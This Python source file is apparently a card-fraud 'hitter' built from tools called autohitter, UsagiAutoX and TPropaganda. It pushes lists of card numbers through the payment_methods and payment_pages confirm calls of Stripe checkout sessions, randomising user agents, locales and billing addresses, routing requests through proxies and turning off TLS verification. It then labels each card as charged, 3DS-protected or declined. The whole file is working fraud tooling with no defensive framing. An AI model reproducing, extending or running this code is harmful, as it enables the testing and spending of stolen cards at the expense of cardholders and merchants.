# -*- coding: utf-8 -*-
"""Stripe charge – combined from autohitter + UsagiAutoX + TPropaganda.
- Retry on disconnect/timeout (from autohitter co.py)
- Random user-agent, billing address, browser_locale/timezone (from extensions)
- Proxy support (from autohitter)
"""
import time
import asyncio
import aiohttp

from billing_data import (
    random_full_name, random_email, random_address,
    random_user_agent, random_timezone, random_locale,
    build_stripe_headers,
)

_session = None

async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False),
            timeout=aiohttp.ClientTimeout(total=25, connect=8),
        )
    return _session

async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
    _session = None

async def init_checkout(pk: str, cs: str, proxy_url: str | None = None) -> dict:
    ua = random_user_agent()
    headers = build_stripe_headers(ua)
    locale = random_locale()
    tz = random_timezone()
    body = f"key={pk}&eid=NA&browser_locale={locale}&browser_timezone={tz}&redirect_type=url"
    s = await get_session()
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/init",
        headers=headers,
        data=body,
        proxy=proxy_url,
    ) as r:
        return await r.json()

async def charge_card_fast(
    card: dict, pk: str, cs: str, init_data: dict,
    proxy_url: str | None = None,
    max_retries: int = 2,
) -> dict:
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    result = {"card": card_str, "status": None, "response": None, "time": 0}

    for attempt in range(max_retries + 1):
        try:
            ua = random_user_agent()
            headers = build_stripe_headers(ua)
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=25, connect=8),
            ) as s:
                email = init_data.get("customer_email") or random_email()
                checksum = init_data.get("init_checksum", "")

                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)

                # Random billing from extensions' approach
                cust = init_data.get("customer") or {}
                addr_default = cust.get("address") or {}
                billing = random_address()
                name = cust.get("name") or billing["name"]
                country = addr_default.get("country") or billing["country"]
                line1 = addr_default.get("line1") or billing["line1"]
                city = addr_default.get("city") or billing["city"]
                state = addr_default.get("state") or billing["state"]
                zip_code = addr_default.get("postal_code") or billing["postal_code"]

                pm_body = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
                    f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
                    f"&billing_details[name]={name}&billing_details[email]={email}"
                    f"&billing_details[address][country]={country}"
                    f"&billing_details[address][line1]={line1}"
                    f"&billing_details[address][city]={city}"
                    f"&billing_details[address][postal_code]={zip_code}"
                    f"&billing_details[address][state]={state}&key={pk}"
                )

                async with s.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers,
                    data=pm_body,
                    proxy=proxy_url,
                ) as r:
                    pm = await r.json()

                if "error" in pm:
                    result["status"] = "DECLINED"
                    result["response"] = pm["error"].get("message", "Card error")[:60]
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result

                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No PM"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result

                conf_body = (
                    f"eid=NA&payment_method={pm_id}&expected_amount={total}"
                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                )

                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                    headers=headers,
                    data=conf_body,
                    proxy=proxy_url,
                ) as r:
                    conf = await r.json()

                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Charged"
                    elif st == "requires_action":
                        result["status"] = "3DS"
                        result["response"] = "3DS Required"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"

                result["time"] = round(time.perf_counter() - start, 2)
                return result

        except Exception as e:
            err_str = str(e).lower()
            retryable = any(kw in err_str for kw in ("disconnect", "timeout", "connection", "reset"))
            if attempt < max_retries and retryable:
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = str(e)[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result

    return result

async def charge_card(
    card: dict, checkout_data: dict, proxy_url: str | None = None
) -> dict:
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    if not pk or not cs or not init_data:
        return {
            "card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}",
            "status": "FAILED",
            "response": "No PK/CS",
            "time": 0,
        }
    return await charge_card_fast(card, pk, cs, init_data, proxy_url)
